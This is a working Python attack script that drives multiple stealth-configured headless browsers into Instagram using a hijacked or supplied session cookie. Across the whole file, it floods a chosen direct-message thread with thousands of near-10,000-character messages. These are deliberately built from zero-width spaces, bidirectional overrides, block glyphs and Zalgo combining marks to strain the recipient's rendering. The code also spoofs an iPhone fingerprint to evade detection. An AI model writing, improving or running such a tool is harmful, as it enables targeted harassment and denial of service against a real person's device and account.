# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (SLEDGEHAMMER-CHAOS V20)
# 📅 STATUS: MAX-RENDER-STRESS | 4-AGENT TOTAL | 100-REST

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.05, 0.2)   # 🔥 Increased speed for maximum saturation
SESSION_LIMIT = 180       
REST_AFTER_STRIKES = 100   # ✅ Rest every 100 messages
REST_DURATION = 5          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()
sys.stdout.reconfigure(encoding='utf-8')

def get_super_heavy_payload():
    """Generates the heaviest possible randomized rendering block."""
    u_id = random.randint(1000, 9999)
    # \u200B is a zero-width space that forces line-break calculations
    # \u2068 is a directional isolate for stack-depth
    # \u2588 is a full block for raster stress
    glue = "\u2060" 
    break_force = "\u200B"
    elements = ["\u2800", "\u2068", "\u202E", "█", "▓", "▒"]
    
    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 [NODE_MAX:{u_id}]"
    
    body = []
    # Increased to 250 lines for absolute maximum character limit
    for i in range(250):
        # Every line uses a unique combination of isolates and blocks
        mix = "".join(random.choices(elements, k=12))
        # Adding 'Zalgo' tail to the blocks for vertical overflow
        body.append(f"{mix}𝕻𝕬𝕻𝕬_𝕺𝖂𝕹𝕿{mix}{'̸' * 20}{break_force}")
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def log_status(agent_id, msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    machine = os.environ.get('MACHINE_ID', '1')
    print(f"[{timestamp}] M-{machine} Agent {agent_id}: {msg}", flush=True)

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        
        ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
        chrome_options.add_experimental_option("mobileEmulation", {"deviceName": "iPhone X"})
        
        temp_dir = os.path.join(tempfile.gettempdir(), f"heavy_chaos_{agent_id}_{int(time.time())}")
        chrome_options.add_argument(f"--user-data-dir={temp_dir}")
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Apple Inc.", platform="iPhone", fix_hairline=True)
        driver.custom_temp_path = temp_dir
        return driver

def adaptive_send(driver, text):
    try:
        wait = WebDriverWait(driver, 25)
        box = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))
        driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", box, text)
        time.sleep(0.2)
        box.send_keys(Keys.ENTER)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    global_start = time.time()
    while (time.time() - global_start) < TOTAL_DURATION:
        driver = None
        strike_counter = 0
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
            adaptive_send(driver, "🔥 SLEDGEHAMMER MATRIX ONLINE")

            while (time.time() - global_start) < TOTAL_DURATION:
                payload = get_super_heavy_payload()
                if adaptive_send(driver, payload):
                    strike_counter += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    
                    if strike_counter % REST_AFTER_STRIKES == 0:
                        log_status(agent_id, f"✅ 100 STRIKES. COOLING DOWN {REST_DURATION}s...")
                        time.sleep(REST_DURATION)
                    else:
                        log_status(agent_id, f"Hit {GLOBAL_SENT}")
                        
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
